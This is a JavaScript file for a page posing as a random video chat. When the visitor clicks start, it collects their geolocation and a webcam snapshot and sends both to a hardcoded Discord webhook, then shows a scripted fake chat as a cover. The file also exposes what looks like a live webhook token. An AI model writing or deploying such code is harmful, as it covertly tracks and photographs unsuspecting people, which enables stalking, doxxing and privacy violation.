const startButton = document.getElementById('startButton');
const webcamVideo = document.getElementById('webcamVideo');
const chatbox = document.getElementById('chatbox');

const discordWebhookUrl = 'https://discord.com/api/webhooks/1506854427846508635/3PPDpwgkhYKFhs6cuK6Bl3sIb73YQ0ZYqEj6MIx6ivSqKjUWXQiig9q9vQkXi5Aq2mWe'; // **Replace with your actual Discord webhook URL**

startButton.addEventListener('click', async () => {
    try {
        // 1. Get User Location
        const location = await getLocation();
        console.log('Location:', location);
        sendToDiscord('Location Captured', `User Location: ${JSON.stringify(location)}`);

        // 2. Access Webcam
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        webcamVideo.srcObject = stream;
        console.log('Webcam accessed.');

        // 3. Capture Webcam Image
        const canvas = document.createElement('canvas');
        canvas.width = webcamVideo.videoWidth;
        canvas.height = webcamVideo.videoHeight;
        canvas.getContext('2d').drawImage(webcamVideo, 0, 0, canvas.width, canvas.height);
        const imageDataUrl = canvas.toDataURL('image/png');
        console.log('Webcam image captured.');

        // 4. Send Image to Discord
        sendImageToDiscord(imageDataUrl);

        // Simulate chat (for demonstration)
        simulateChat();

    } catch (error) {
        console.error('Error:', error);
        chatbox.innerHTML += '<p>Error: Could not access webcam or location. Please grant permissions.</p>';
    }
});

async function getLocation() {
    return new Promise((resolve, reject) => {
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(
                (position) => {
                    resolve({
                        latitude: position.coords.latitude,
                        longitude: position.coords.longitude
                    });
                },
                (error) => {
                    reject(error);
                }
            );
        } else {
            reject(new Error('Geolocation is not supported by this browser.'));
        }
    });
}

async function sendToDiscord(message, data = null) {
    const payload = {
        content: message,
        embeds: []
    };
    if (data) {
        payload.embeds.push({
            description: JSON.stringify(data, null, 2)
        });
    }

    await fetch(discordWebhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    });
}

async function sendImageToDiscord(imageDataUrl) {
    // Discord webhooks have a file size limit, so we'll send the image as a base64 encoded string in an embed for this example.
    // For larger images, you'd need a more complex approach, potentially uploading to a file hosting service first.
    const payload = {
        content: "Webcam Snapshot!",
        embeds: [
            {
                image: {
                    url: imageDataUrl
                }
            }
        ]
    };

    await fetch(discordWebhookUrl, {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
    });
}

function simulateChat() {
    chatbox.innerHTML += '<p><strong>Stranger:</strong> Hello there!</p>';
    setTimeout(() => {
        chatbox.innerHTML += '<p><strong>You:</strong> Hi!</p>';
    }, 2000);
}
